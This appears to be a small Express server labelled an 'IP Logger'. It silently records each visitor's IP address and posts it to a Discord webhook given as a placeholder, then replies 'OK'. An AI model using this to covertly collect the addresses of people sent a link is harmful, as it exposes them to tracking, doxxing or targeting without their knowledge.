const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Your Discord webhook (REPLACE THIS)
const webhookURL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";

// Use CORS to allow the frontend to send requests
app.use(cors());

app.get('/', (req, res) => {
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    ip = ip.replace('::ffff:', ''); // Clean IP format

    // Send IP to Discord webhook
    axios.post(webhookURL, { content: `📌 **New Visitor IP:** ${ip}` })
        .then(() => console.log(`Logged IP: ${ip}`))
        .catch(err => console.error("Webhook error:", err));

    res.send("OK"); // Simple response
});

app.listen(PORT, () => console.log(`IP Logger running on port ${PORT}`));
